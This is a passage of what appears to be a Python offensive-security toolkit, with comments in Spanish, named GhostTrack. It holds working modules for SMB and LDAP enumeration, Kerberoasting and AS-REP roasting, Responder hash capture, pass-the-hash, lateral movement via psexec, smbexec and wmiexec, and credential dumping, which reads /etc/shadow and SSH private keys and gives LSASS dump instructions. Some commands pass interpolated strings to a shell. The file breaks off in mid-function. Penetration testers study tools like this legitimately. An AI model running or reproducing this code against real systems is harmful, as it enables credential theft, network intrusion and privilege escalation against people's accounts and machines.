"""
═══════════════════════════════════════════════════════════════════
GHOSTTRACK RED TEAM MODULES - 20 MÓDULOS FUNCIONALES
═══════════════════════════════════════════════════════════════════
SOLO PARA FINES EDUCATIVOS Y CON AUTORIZACIÓN EXPLÍCITA

Requisitos para funcionalidad completa en Kali Linux:
  pip install impacket ldap3 pycryptodome requests
  apt-get install -y aircrack-ng bluez nmap

Autor: nemoDev0x
═══════════════════════════════════════════════════════════════════
"""

import socket
import subprocess
import os
import re
import sys
import json
import base64
import hashlib
import struct
import platform
import threading
import ipaddress
from datetime import datetime
from queue import Queue
from typing import List, Dict, Tuple, Optional


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 1: SMB ENUMERATION
# ═══════════════════════════════════════════════════════════════════

class SMBEnumerator:
    """Enumeración completa de servicios SMB/CIFS"""

    def __init__(self, target: str, username: str = '', password: str = '', domain: str = ''):
        self.target  = target
        self.username = username
        self.password = password
        self.domain   = domain
        self.results  = {}

    def check_port(self) -> bool:
        """Verifica si el puerto 445 está abierto"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            r = s.connect_ex((self.target, 445))
            s.close()
            return r == 0
        except Exception:
            return False

    def check_null_session(self) -> bool:
        """Verifica si el servidor permite null sessions"""
        print(f"[*] Verificando null session en {self.target}")
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(self.target, self.target, timeout=5)
            conn.login('', '')
            print("[+] ¡Null session PERMITIDA! (vulnerabilidad)")
            conn.close()
            return True
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            if 'STATUS_ACCESS_DENIED' in str(e) or 'STATUS_LOGON_FAILURE' in str(e):
                print("[-] Null session denegada (correcto)")
            else:
                print(f"[-] {e}")
        return False

    def enumerate_shares(self) -> List[Dict]:
        """Enumera shares SMB disponibles"""
        print(f"[*] Enumerando shares SMB en {self.target}")
        shares = []
        if not self.check_port():
            print(f"[-] Puerto 445 cerrado en {self.target}")
            return shares
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(self.target, self.target, timeout=5)
            conn.login(self.username, self.password, self.domain)
            resp = conn.listShares()
            for share in resp:
                name    = share['shi1_netname'][:-1]
                comment = share['shi1_remark'][:-1]
                shares.append({'name': name, 'comment': comment})
                print(f"[+] Share: {name:20s} Comment: {comment}")
            conn.close()
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            print(f"[!] Error enumerando shares: {e}")
        return shares

    def enumerate_users(self) -> List[str]:
        """Enumera usuarios via RPC"""
        print(f"[*] Enumerando usuarios en {self.target}")
        users = []
        try:
            from impacket.dcerpc.v5 import transport, samr
            binding = f"ncacn_np:{self.target}[\\pipe\\samr]"
            trans = transport.DCERPCTransportFactory(binding)
            if self.username:
                trans.set_credentials(self.username, self.password, self.domain)
            dce = trans.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']
            resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp2['Buffer']['Buffer']
            for domain in domains:
                domain_name = domain['Name']
                resp3 = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain_name)
                domainSid = resp3['DomainId']
                resp4 = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainSid)
                domainHandle = resp4['DomainHandle']
                resp5 = samr.hSamrEnumerateUsersInDomain(dce, domainHandle)
                for user in resp5['Buffer']['Buffer']:
                    users.append(user['Name'])
                    print(f"[+] Usuario: {user['Name']}")
            dce.disconnect()
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            print(f"[!] Error enumerando usuarios: {e}")
        return users

    def check_smb_signing(self) -> Dict:
        """Verifica si SMB Signing está habilitado"""
        print(f"[*] Verificando SMB Signing en {self.target}")
        result = {'signing_required': None, 'signing_enabled': None}
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(self.target, self.target, timeout=5)
            conn.login(self.username, self.password, self.domain)
            signing = conn.isSigningRequired()
            result['signing_required'] = signing
            if signing:
                print("[-] SMB Signing REQUERIDO (protegido contra relay)")
            else:
                print("[+] SMB Signing NO requerido (vulnerable a NTLM relay)")
            conn.close()
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            print(f"[!] Error: {e}")
        return result

    def run(self) -> Dict:
        """Ejecuta la enumeración completa"""
        self.results = {
            'target': self.target,
            'port_445_open': self.check_port(),
            'null_session': self.check_null_session(),
            'shares': self.enumerate_shares(),
            'users': self.enumerate_users(),
            'smb_signing': self.check_smb_signing()
        }
        return self.results


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 2: LDAP ENUMERATION
# ═══════════════════════════════════════════════════════════════════

class LDAPEnumerator:
    """Enumeración de Active Directory via LDAP"""

    def __init__(self, target: str, domain: str, username: str = '', password: str = ''):
        self.target   = target
        self.domain   = domain
        self.username = username
        self.password = password
        self.base_dn  = ','.join([f"DC={p}" for p in domain.split('.')])
        self.conn     = None

    def _connect(self) -> bool:
        """Establece conexión LDAP"""
        try:
            import ldap3
            server = ldap3.Server(self.target, get_info=ldap3.ALL, port=389, use_ssl=False)
            if self.username:
                user = f"{self.domain}\\{self.username}"
                self.conn = ldap3.Connection(server, user=user, password=self.password, auto_bind=True)
            else:
                self.conn = ldap3.Connection(server, auto_bind=True)
            print(f"[+] Conexión LDAP establecida con {self.target}")
            return True
        except ImportError:
            print("[!] ldap3 no instalado: pip install ldap3")
        except Exception as e:
            print(f"[!] Error conectando LDAP: {e}")
        return False

    def enumerate_users(self) -> List[Dict]:
        """Enumera usuarios del dominio con atributos importantes"""
        print(f"[*] Enumerando usuarios en {self.domain}")
        users = []
        if not self._connect():
            return users
        try:
            import ldap3
            attrs = [
                'sAMAccountName', 'userAccountControl', 'servicePrincipalName',
                'memberOf', 'pwdLastSet', 'lastLogon', 'description',
                'mail', 'displayName', 'adminCount'
            ]
            self.conn.search(
                self.base_dn,
                '(&(objectClass=user)(!(objectClass=computer)))',
                attributes=attrs
            )
            for entry in self.conn.entries:
                uac = int(entry.userAccountControl.value) if entry.userAccountControl else 0
                user = {
                    'username':    str(entry.sAMAccountName),
                    'displayName': str(entry.displayName) if entry.displayName else '',
                    'disabled':    bool(uac & 0x2),
                    'no_expire':   bool(uac & 0x10000),
                    'no_preauth':  bool(uac & 0x400000),   # Vulnerable AS-REP Roasting
                    'spn':         list(entry.servicePrincipalName) if entry.servicePrincipalName else [],
                    'adminCount':  int(entry.adminCount.value) if entry.adminCount else 0,
                    'description': str(entry.description) if entry.description else '',
                }
                users.append(user)
                flags = []
                if user['disabled']:     flags.append('DISABLED')
                if user['no_preauth']:   flags.append('AS-REP_ROASTABLE')
                if user['spn']:          flags.append('KERBEROASTABLE')
                if user['adminCount']:   flags.append('ADMIN')
                flag_str = ' | '.join(flags) if flags else 'normal'
                print(f"[+] {user['username']:25s} [{flag_str}]")
        except Exception as e:
            print(f"[!] Error enumerando usuarios: {e}")
        return users

    def enumerate_groups(self) -> List[Dict]:
        """Enumera grupos del dominio"""
        print(f"[*] Enumerando grupos en {self.domain}")
        groups = []
        if not self.conn and not self._connect():
            return groups
        try:
            self.conn.search(
                self.base_dn,
                '(objectClass=group)',
                attributes=['sAMAccountName', 'member', 'description']
            )
            for entry in self.conn.entries:
                name    = str(entry.sAMAccountName)
                members = list(entry.member) if entry.member else []
                groups.append({'name': name, 'member_count': len(members)})
                print(f"[+] Grupo: {name:35s} Miembros: {len(members)}")
        except Exception as e:
            print(f"[!] Error enumerando grupos: {e}")
        return groups

    def find_spn_accounts(self) -> List[Dict]:
        """Encuentra cuentas con SPN (vulnerables a Kerberoasting)"""
        print(f"[*] Buscando cuentas con SPN (Kerberoastable)")
        spn_accounts = []
        if not self.conn and not self._connect():
            return spn_accounts
        try:
            self.conn.search(
                self.base_dn,
                '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))',
                attributes=['sAMAccountName', 'servicePrincipalName']
            )
            for entry in self.conn.entries:
                for spn in entry.servicePrincipalName:
                    spn_accounts.append({'user': str(entry.sAMAccountName), 'spn': spn})
                    print(f"[+] SPN: {spn}  ->  User: {entry.sAMAccountName}")
        except Exception as e:
            print(f"[!] Error buscando SPNs: {e}")
        return spn_accounts

    def find_asrep_users(self) -> List[str]:
        """Encuentra cuentas sin preautenticación (vulnerables a AS-REP Roasting)"""
        print(f"[*] Buscando cuentas sin preauth Kerberos (AS-REP Roastable)")
        users = []
        if not self.conn and not self._connect():
            return users
        try:
            # userAccountControl: bit 0x400000 = DONT_REQUIRE_PREAUTH
            self.conn.search(
                self.base_dn,
                '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                attributes=['sAMAccountName']
            )
            for entry in self.conn.entries:
                users.append(str(entry.sAMAccountName))
                print(f"[+] AS-REP Roastable: {entry.sAMAccountName}")
        except Exception as e:
            print(f"[!] Error: {e}")
        return users

    def run(self) -> Dict:
        return {
            'target': self.target,
            'domain': self.domain,
            'users':  self.enumerate_users(),
            'groups': self.enumerate_groups(),
            'spn_accounts': self.find_spn_accounts(),
            'asrep_users':  self.find_asrep_users(),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 3: KERBEROS ATTACKS
# ═══════════════════════════════════════════════════════════════════

class KerberosAttacker:
    """Ataques Kerberos: Kerberoasting y AS-REP Roasting"""

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip  = dc_ip

    def kerberoast(self, username: str, password: str) -> List[Dict]:
        """Kerberoasting via impacket GetUserSPNs"""
        print(f"[*] Iniciando Kerberoasting en {self.domain}")
        tickets = []
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5 import constants
            from impacket.krb5.types import KerberosTime, Principal
            import datetime as dt

            userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName, password, self.domain, '', '', '', self.dc_ip
            )
            print(f"[+] TGT obtenido para {username}")

            # Buscar cuentas con SPN
            ldap_enum = LDAPEnumerator(self.dc_ip, self.domain, username, password)
            spn_accounts = ldap_enum.find_spn_accounts()

            for account in spn_accounts:
                try:
                    spn = account['spn']
                    serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher2, _, _ = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
                    # Formatear hash para hashcat (-m 13100)
                    # Simplificado: guardar raw para análisis
                    tickets.append({'user': account['user'], 'spn': spn, 'tgs': base64.b64encode(tgs).decode()})
                    print(f"[+] TGS obtenido para: {spn}")
                except Exception as e2:
                    print(f"[-] Error TGS para {spn}: {e2}")
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
            print(f"[*] Alternativa manual:")
            print(f"    GetUserSPNs.py {self.domain}/{username}:{password} -dc-ip {self.dc_ip} -request")
        except Exception as e:
            print(f"[!] Error Kerberoasting: {e}")
        return tickets

    def asrep_roast(self, userlist: List[str]) -> List[Dict]:
        """AS-REP Roasting para usuarios sin preauth"""
        print(f"[*] Iniciando AS-REP Roasting en {self.domain}")
        hashes = []
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal

            for user in userlist:
                try:
                    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    # Sin contraseña — si el usuario no requiere preauth, el KDC responde
                    tgt, cipher, _, _ = getKerberosTGT(userName, '', self.domain, '', '', '', self.dc_ip)
                    hashes.append({'user': user, 'hash': base64.b64encode(tgt).decode()})
                    print(f"[+] AS-REP hash obtenido para: {user}")
                except Exception as e2:
                    if 'KDC_ERR_PREAUTH_REQUIRED' in str(e2):
                        print(f"[-] {user}: preauth requerida")
                    else:
                        print(f"[-] {user}: {e2}")
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
            print(f"[*] Alternativa:")
            print(f"    GetNPUsers.py {self.domain}/ -usersfile users.txt -dc-ip {self.dc_ip} -format hashcat")
        except Exception as e:
            print(f"[!] Error AS-REP Roasting: {e}")
        return hashes

    def run(self, username: str = '', password: str = '', userlist: List[str] = None) -> Dict:
        results = {'tickets': [], 'asrep_hashes': []}
        if username and password:
            results['tickets'] = self.kerberoast(username, password)
        if userlist:
            results['asrep_hashes'] = self.asrep_roast(userlist)
        return results


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 4: NTLM RELAY
# ═══════════════════════════════════════════════════════════════════

class NTLMRelayAttacker:
    """NTLM Relay y Pass-the-Hash"""

    def __init__(self):
        self.captured_hashes = []

    def check_responder_available(self) -> bool:
        """Verifica si Responder está disponible en el sistema"""
        result = subprocess.run(['which', 'responder'], capture_output=True, text=True)
        return result.returncode == 0

    def capture_hashes_responder(self, interface: str = 'eth0') -> str:
        """Lanza Responder para capturar hashes NTLM"""
        print(f"[*] Capturando hashes NTLM con Responder en {interface}")
        if not self.check_responder_available():
            print("[!] Responder no encontrado.")
            print("[*] Instalar: apt-get install responder")
            print(f"[*] Uso manual: responder -I {interface} -rdw")
            return ""
        if os.geteuid() != 0:
            print("[!] Responder requiere root (sudo python main.py ...)")
            return ""
        print(f"[+] Lanzando Responder en {interface} (Ctrl+C para detener)")
        print("[*] Los hashes capturados se guardarán en /usr/share/responder/logs/")
        try:
            subprocess.run(['responder', '-I', interface, '-rdw'], timeout=30)
        except subprocess.TimeoutExpired:
            print("[+] Tiempo de captura finalizado")
        except KeyboardInterrupt:
            print("[+] Captura detenida por usuario")
        return '/usr/share/responder/logs/'

    def pass_the_hash(self, target: str, username: str, lm_hash: str, nt_hash: str, command: str = 'whoami') -> str:
        """Pass-the-Hash usando impacket psexec/smbexec"""
        print(f"[*] Pass-the-Hash en {target} como {username}")
        output = ""
        try:
            from impacket.smbconnection import SMBConnection
            hash_val = f"{lm_hash}:{nt_hash}"
            conn = SMBConnection(target, target, timeout=5)
            conn.login(username, '', lmhash=lm_hash, nthash=nt_hash)
            print(f"[+] Autenticación PTH exitosa en {target} como {username}")
            conn.close()

            # Ejecutar comando con smbexec si está disponible
            cmd = ['smbexec.py', f'{username}@{target}', '-hashes', hash_val, '-c', command]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = result.stdout
            print(f"[+] Resultado PTH: {output}")
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            print(f"[!] Error PTH: {e}")
        return output

    def check_ntlm_relay_targets(self, network: str) -> List[str]:
        """Busca hosts sin SMB Signing (vulnerables a relay)"""
        print(f"[*] Buscando hosts sin SMB Signing en {network}")
        vulnerable = []
        try:
            net = ipaddress.ip_network(network, strict=False)
            for ip in list(net.hosts())[:20]:  # Limitar a 20 hosts
                ip_str = str(ip)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    if s.connect_ex((ip_str, 445)) == 0:
                        from impacket.smbconnection import SMBConnection
                        conn = SMBConnection(ip_str, ip_str, timeout=3)
                        conn.login('', '')
                        if not conn.isSigningRequired():
                            vulnerable.append(ip_str)
                            print(f"[+] {ip_str} - SMB Signing NO requerido (VULNERABLE)")
                        conn.close()
                    s.close()
                except Exception:
                    pass
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except Exception as e:
            print(f"[!] Error: {e}")
        return vulnerable

    def run(self, interface: str = 'eth0') -> Dict:
        return {
            'responder_available': self.check_responder_available(),
            'hashes_dir': self.capture_hashes_responder(interface) if self.check_responder_available() else 'N/A'
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 5: BLOODHOUND COLLECTOR
# ═══════════════════════════════════════════════════════════════════

class BloodHoundCollector:
    """Recolección de datos para BloodHound"""

    def __init__(self, domain: str, dc_ip: str, username: str = '', password: str = ''):
        self.domain   = domain
        self.dc_ip    = dc_ip
        self.username = username
        self.password = password

    def check_bloodhound_available(self) -> bool:
        """Verifica si BloodHound/SharpHound está disponible"""
        for tool in ['bloodhound-python', 'bloodhound']:
            r = subprocess.run(['which', tool], capture_output=True)
            if r.returncode == 0:
                return True
        return False

    def collect_with_bloodhound_python(self) -> str:
        """Recolección usando bloodhound-python"""
        print(f"[*] Recolectando datos BloodHound de {self.domain}")
        output_dir = f"bloodhound_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(output_dir, exist_ok=True)
        try:
            cmd = [
                'bloodhound-python',
                '-d', self.domain,
                '-u', self.username,
                '-p', self.password,
                '-ns', self.dc_ip,
                '-c', 'All',
                '--zip',
                '-o', output_dir
            ]
            print(f"[*] Ejecutando: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode == 0:
                print(f"[+] Datos recolectados en: {output_dir}/")
                print(f"[+] Importar el .zip en BloodHound GUI")
            else:
                print(f"[!] Error: {result.stderr}")
                print("[*] Instalar: pip install bloodhound")
        except FileNotFoundError:
            print("[!] bloodhound-python no encontrado")
            print("[*] Instalar: pip install bloodhound")
        except subprocess.TimeoutExpired:
            print("[!] Timeout en recolección BloodHound")
        except Exception as e:
            print(f"[!] Error: {e}")
        return output_dir

    def collect_manual(self) -> Dict:
        """Recolección manual de datos AD para análisis"""
        print(f"[*] Recolección manual de datos AD en {self.domain}")
        data = {'users': [], 'computers': [], 'groups': [], 'ous': []}
        try:
            ldap = LDAPEnumerator(self.dc_ip, self.domain, self.username, self.password)
            data['users']  = ldap.enumerate_users()
            data['groups'] = ldap.enumerate_groups()
        except Exception as e:
            print(f"[!] Error en recolección manual: {e}")
        return data

    def run(self) -> Dict:
        if self.check_bloodhound_available():
            return {'output_dir': self.collect_with_bloodhound_python()}
        else:
            print("[!] bloodhound-python no disponible, ejecutando recolección manual")
            return self.collect_manual()


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 6: PRIVILEGE ESCALATION CHECKER
# ═══════════════════════════════════════════════════════════════════

class PrivilegeEscalationChecker:
    """Detección de vectores de escalada de privilegios"""

    def __init__(self):
        self.os = platform.system().lower()

    def check_suid_binaries(self) -> List[Dict]:
        """Busca binarios SUID en Linux"""
        print("[*] Buscando binarios SUID...")
        suid_bins = []
        if self.os == 'windows':
            print("[-] SUID no aplica en Windows")
            return suid_bins
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True, text=True, timeout=30
            )
            gtfobins = [
                'bash','sh','python','python3','perl','ruby','awk','find',
                'nmap','vim','vi','nano','less','more','cat','cp','mv',
                'tee','wget','curl','tar','zip','unzip','env','node'
            ]
            for line in result.stdout.strip().split('\n'):
                if line:
                    binary_name = os.path.basename(line)
                    is_dangerous = binary_name in gtfobins
                    suid_bins.append({'path': line, 'dangerous': is_dangerous})
                    if is_dangerous:
                        print(f"[+] SUID peligroso: {line}")
                    else:
                        print(f"[*] SUID: {line}")
        except subprocess.TimeoutExpired:
            print("[!] Timeout buscando SUID")
        except Exception as e:
            print(f"[!] Error SUID: {e}")
        return suid_bins

    def check_writable_paths(self) -> List[str]:
        """Busca directorios escribibles en el PATH del sistema"""
        print("[*] Buscando directorios PATH escribibles...")
        writable = []
        path_dirs = os.environ.get('PATH', '').split(':')
        for d in path_dirs:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                writable.append(d)
                print(f"[+] Directorio PATH escribible: {d}")
        return writable

    def check_sudo_permissions(self) -> str:
        """Verifica permisos sudo del usuario actual"""
        print("[*] Verificando permisos sudo...")
        if self.os == 'windows':
            return 'N/A en Windows'
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=5)
            output = result.stdout + result.stderr
            if 'NOPASSWD' in output:
                print("[+] ¡Permisos sudo sin contraseña detectados!")
            print(output)
            return output
        except Exception as e:
            print(f"[!] Error verificando sudo: {e}")
        return ""

    def check_capabilities(self) -> List[str]:
        """Verifica capabilities de procesos/ficheros en Linux"""
        print("[*] Verificando capabilities peligrosas...")
        dangerous_caps = []
        if self.os == 'windows':
            print("[-] Capabilities no aplican en Windows")
            return dangerous_caps
        try:
            result = subprocess.run(
                ['getcap', '-r', '/'], capture_output=True, text=True, timeout=15
            )
            dangerous = ['cap_setuid', 'cap_net_raw', 'cap_sys_admin', 'cap_dac_override']
            for line in result.stdout.split('\n'):
                if any(cap in line for cap in dangerous):
                    dangerous_caps.append(line.strip())
                    print(f"[+] Capability peligrosa: {line.strip()}")
        except FileNotFoundError:
            print("[!] getcap no disponible: apt-get install libcap2-bin")
        except Exception as e:
            print(f"[!] Error capabilities: {e}")
        return dangerous_caps

    def check_cron_jobs(self) -> List[str]:
        """Busca cron jobs con permisos inseguros"""
        print("[*] Verificando cron jobs...")
        suspicious = []
        if self.os == 'windows':
            return suspicious
        cron_files = [
            '/etc/crontab', '/etc/cron.d/', '/var/spool/cron/crontabs/',
            '/etc/cron.hourly/', '/etc/cron.daily/', '/etc/cron.weekly/'
        ]
        for cron_path in cron_files:
            if os.path.exists(cron_path):
                if os.path.isfile(cron_path):
                    if os.access(cron_path, os.W_OK):
                        suspicious.append(cron_path)
                        print(f"[+] Cron escribible: {cron_path}")
                    try:
                        with open(cron_path) as f:
                            content = f.read()
                        for line in content.split('\n'):
                            if line and not line.startswith('#'):
                                # Buscar scripts en rutas escribibles
                                parts = line.split()
                                for part in parts:
                                    if part.startswith('/') and os.path.exists(part):
                                        if os.access(part, os.W_OK):
                                            suspicious.append(f"Script escribible en cron: {part}")
                                            print(f"[+] Script cron escribible: {part}")
                    except Exception:
                        pass
        return suspicious

    def check_kernel_version(self) -> Dict:
        """Verifica la versión del kernel y exploits conocidos"""
        print("[*] Verificando versión del kernel...")
        result = {'version': '', 'exploits': []}
        if self.os == 'windows':
            try:
                r = subprocess.run(['systeminfo'], capture_output=True, text=True)
                result['version'] = r.stdout[:500]
            except Exception:
                pass
            return result
        try:
            r = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            version = r.stdout.strip()
            result['version'] = version
            print(f"[*] Kernel: {version}")

            # Exploits conocidos simplificados
            known_exploits = {
                '4.4': 'Dirty COW (CVE-2016-5195)',
                '5.8': 'DirtyPipe (CVE-2022-0847)',
                '3.1': 'Dirty COW compatible',
            }
            for kver, exploit in known_exploits.items():
                if version.startswith(kver):
                    result['exploits'].append(exploit)
                    print(f"[+] Posible exploit: {exploit}")
        except Exception as e:
            print(f"[!] Error: {e}")
        return result

    def check_all_linux(self) -> Dict:
        """Ejecuta todas las comprobaciones Linux"""
        return {
            'suid_binaries': self.check_suid_binaries(),
            'writable_paths': self.check_writable_paths(),
            'sudo_permissions': self.check_sudo_permissions(),
            'capabilities': self.check_capabilities(),
            'cron_jobs': self.check_cron_jobs(),
            'kernel': self.check_kernel_version()
        }

    def check_all_windows(self) -> Dict:
        """Comprobaciones básicas en Windows"""
        if self.os != 'windows':
            return self.check_all_linux()
        results = {}
        # Verificar si hay privileges de alto nivel
        try:
            r = subprocess.run(['whoami', '/priv'], capture_output=True, text=True)
            results['privileges'] = r.stdout
            dangerous_privs = ['SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege',
                               'SeDebugPrivilege', 'SeBackupPrivilege']
            for priv in dangerous_privs:
                if priv in r.stdout:
                    print(f"[+] Privilegio peligroso detectado: {priv}")
            # Buscar Unquoted Service Paths
            r2 = subprocess.run(
                ['wmic', 'service', 'get', 'pathname'],
                capture_output=True, text=True
            )
            for line in r2.stdout.split('\n'):
                if line and ' ' in line and not line.startswith('"') and '\\' in line:
                    print(f"[+] Unquoted Service Path: {line.strip()}")
            results['services'] = r2.stdout
        except Exception as e:
            print(f"[!] Error Windows PrivEsc: {e}")
        return results


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 7: LATERAL MOVEMENT
# ═══════════════════════════════════════════════════════════════════

class LateralMovementDetector:
    """Detección y ejecución de movimiento lateral"""

    def __init__(self, target: str, username: str = '', password: str = '',
                 lm_hash: str = '', nt_hash: str = '', domain: str = ''):
        self.target   = target
        self.username = username
        self.password = password
        self.lm_hash  = lm_hash
        self.nt_hash  = nt_hash
        self.domain   = domain

    def check_winrm(self) -> bool:
        """Verifica si WinRM está habilitado"""
        for port in [5985, 5986]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if s.connect_ex((self.target, port)) == 0:
                    print(f"[+] WinRM abierto en {self.target}:{port}")
                    s.close()
                    return True
                s.close()
            except Exception:
                pass
        print(f"[-] WinRM no disponible en {self.target}")
        return False

    def psexec(self, command: str = 'whoami') -> str:
        """Movimiento lateral via PsExec (impacket)"""
        print(f"[*] PsExec en {self.target} -> {command}")
        output = ""
        try:
            from impacket.examples.utils import parse_target
            cred = f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"
            hashes = f"{self.lm_hash}:{self.nt_hash}" if self.nt_hash else None
            cmd = ['psexec.py']
            if hashes:
                cmd += ['-hashes', hashes]
            cmd += [f"{cred}@{self.target}", command]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout
            print(f"[+] PsExec resultado: {output}")
        except ImportError:
            print("[!] impacket no instalado: pip install impacket")
        except FileNotFoundError:
            # psexec.py puede estar en PATH como script
            print("[!] psexec.py no encontrado en PATH")
            print(f"[*] Alternativa: psexec.py {self.username}:{self.password}@{self.target} {command}")
        except Exception as e:
            print(f"[!] Error PsExec: {e}")
        return output

    def smbexec(self, command: str = 'whoami') -> str:
        """Movimiento lateral via SMBExec"""
        print(f"[*] SMBExec en {self.target} -> {command}")
        try:
            cred = f"{self.username}:{self.password}" if self.password else f"{self.username}"
            hashes = f"-hashes {self.lm_hash}:{self.nt_hash}" if self.nt_hash else ""
            cmd_str = f"smbexec.py {hashes} {cred}@{self.target} -c '{command}'"
            print(f"[*] Ejecutando: {cmd_str}")
            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30)
            print(f"[+] Resultado: {result.stdout}")
            return result.stdout
        except Exception as e:
            print(f"[!] Error SMBExec: {e}")
        return ""

    def wmiexec(self, command: str = 'whoami') -> str:
        """Ejecución remota via WMI"""
        print(f"[*] WMIExec en {self.target} -> {command}")
        try:
            cred = f"{self.username}:{self.password}"
            cmd_str = f"wmiexec.py {cred}@{self.target} '{command}'"
            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30)
            print(f"[+] Resultado: {result.stdout}")
            return result.stdout
        except Exception as e:
            print(f"[!] Error WMIExec: {e}")
        return ""

    def scan_reachable_hosts(self, network: str) -> List[str]:
        """Detecta hosts accesibles en la red"""
        print(f"[*] Escaneando hosts accesibles en {network}")
        reachable = []
        try:
            net = ipaddress.ip_network(network, strict=False)
            threads = []
            lock = threading.Lock()

            def check_host(ip):
                try:
                    s = socket.socket()
                    s.settimeout(0.5)
                    if s.connect_ex((str(ip), 445)) == 0:
                        with lock:
                            reachable.append(str(ip))
                            print(f"[+] Host activo (SMB): {ip}")
                    s.close()
                except Exception:
                    pass

            for ip in list(net.hosts())[:254]:
                t = threading.Thread(target=check_host, args=(ip,))
                threads.append(t)
                t.start()
                if len(threads) >= 50:
                    for t in threads:
                        t.join()
                    threads = []
            for t in threads:
                t.join()
        except Exception as e:
            print(f"[!] Error: {e}")
        return reachable

    def run(self, command: str = 'whoami') -> Dict:
        return {
            'winrm_available': self.check_winrm(),
            'psexec_output':   self.psexec(command),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 8: CREDENTIAL DUMPER
# ═══════════════════════════════════════════════════════════════════

class CredentialDumper:
    """Extracción de credenciales del sistema"""

    def __init__(self, target: str = 'localhost', username: str = '',
                 password: str = '', domain: str = ''):
        self.target   = target
        self.username = username
        self.password = password
        self.domain   = domain

    def dump_sam_secretsdump(self) -> str:
        """Dump de SAM usando secretsdump de impacket (local o remoto)"""
        print(f"[*] Dump SAM en {self.target}")
        output = ""
        try:
            if self.target == 'localhost' or self.target == '127.0.0.1':
                # Dump local (requiere root)
                if os.geteuid() != 0:
                    print("[!] Requiere root: sudo python main.py ...")
                    return ""
                cmd = ['secretsdump.py', '-local', 'LOCAL']
            else:
                cred = f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"
                cmd = ['secretsdump.py', f"{cred}@{self.target}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout
            print(output)
        except FileNotFoundError:
            print("[!] secretsdump.py no encontrado")
            print("[*] Instalar: pip install impacket")
        except Exception as e:
            print(f"[!] Error secretsdump: {e}")
        return output

    def dump_lsass_procdump(self) -> str:
        """Dump de LSASS usando técnicas de sistema (Linux: /proc)"""
        print("[*] Intentando dump de credenciales del sistema")
        if platform.system().lower() == 'linux':
            # En Linux buscar credenciales en memoria
            print("[*] Sistema Linux detectado")
            print("[*] Buscando credenciales en /proc...")
            try:
                # Buscar archivos con credenciales conocidas
                locations = [
                    '/etc/shadow', '/etc/passwd',
                    os.path.expanduser('~/.bash_history'),
                    os.path.expanduser('~/.ssh/id_rsa')
                ]
                found = []
                for loc in locations:
                    if os.path.exists(loc) and os.access(loc, os.R_OK):
                        found.append(loc)
                        print(f"[+] Acceso a: {loc}")
                return '\n'.join(found)
            except Exception as e:
                print(f"[!] Error: {e}")
        else:
            print("[*] En Windows usar: procdump.exe -ma lsass.exe lsass.dmp")
            print("[*] Luego: pypykatz lsa minidump lsass.dmp")
        return ""

    def dump_wifi_passwords(self) -> List[Dict]:
        """Extrae contraseñas WiFi guardadas"""
        print("[*] Extrayendo contraseñas WiFi")
        credentials = []
        if platform.system().lower() == 'linux':
            wifi_dir = '/etc/NetworkManager/system-connections/'
            if os.path.exists(wifi_dir):
